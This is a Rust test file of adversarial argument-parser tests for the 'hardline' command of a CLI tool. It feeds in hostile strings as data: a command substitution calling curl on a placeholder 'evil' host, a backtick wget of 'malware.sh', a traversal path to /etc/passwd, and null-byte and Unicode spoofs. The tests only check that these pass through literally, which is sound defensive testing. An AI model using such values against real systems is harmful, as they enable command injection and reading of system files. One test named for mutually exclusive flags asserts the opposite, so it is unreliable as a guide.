//! RED-QUEEN coevolutionary adversarial tests for vo-cli hardline command.
//! Flag mutations, edge cases, adversarial inputs.

use vo_cli::cli::{interpret_cli_from, CliError, Command};

#[test]
fn rq_hardline_rejects_empty_target() {
    assert!(interpret_cli_from(["vo", "hardline", ""]).is_err());
}

#[test]
fn rq_hardline_shell_metachar_passthrough() {
    let payload = "$(curl http://evil)";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_backtick_substitution_literal() {
    let payload = "`wget malware.sh`";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_path_traversal_accepted_raw() {
    let cli = interpret_cli_from(["vo", "hardline", "/../../../etc/passwd"]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, "/../../../etc/passwd");
    }
}

#[test]
fn rq_hardline_double_dash_escape_handled() {
    let cli = interpret_cli_from(["vo", "hardline", "--", "--force"]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, "--force");
    }
}

#[test]
fn rq_hardline_force_and_dry_run_mutually_exclusive() {
    let cli = interpret_cli_from(["vo", "hardline", "target-1", "--force", "--dry-run"]).unwrap();
    if let Command::Hardline { force, dry_run, .. } = cli.command {
        assert!(force && dry_run);
    }
}

#[test]
fn rq_hardline_unicode_spoof_accepted() {
    let payload = "target-\u{FF11}\u{FF12}";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_rlo_spoof_in_target() {
    let payload = "normal\u{202E}file.txt";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_null_byte_truncation_test() {
    let payload = "safe\0;malware";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_missing_target_fails() {
    assert!(interpret_cli_from(["vo", "hardline"]).is_err());
}

#[test]
fn rq_hardline_unknown_flag_maps_to_exit_2() {
    let err = interpret_cli_from(["vo", "hardline", "t", "--bogus"]).unwrap_err();
    assert_eq!(vo_cli::cli::map_error_to_exit_code(&CliError::from(err)), 2);
}

#[test]
fn rq_hardline_4kb_target_accepted() {
    let payload: String = "t".repeat(4096);
    let cli = interpret_cli_from(["vo", "hardline", &payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target.len(), 4096);
    }
}

#[test]
fn rq_hardline_custom_engine_url_flag() {
    let cli = interpret_cli_from([
        "vo",
        "hardline",
        "my-target",
        "--engine-url",
        "http://localhost:9999",
    ])
    .unwrap();
    if let Command::Hardline { engine_url, .. } = cli.command {
        assert_eq!(engine_url, "http://localhost:9999");
    }
}

#[test]
fn rq_hardline_timeout_flag_accepts_valid_value() {
    let cli = interpret_cli_from(["vo", "hardline", "t", "--timeout", "300"]).unwrap();
    if let Command::Hardline { timeout, .. } = cli.command {
        assert_eq!(timeout, 300);
    }
}
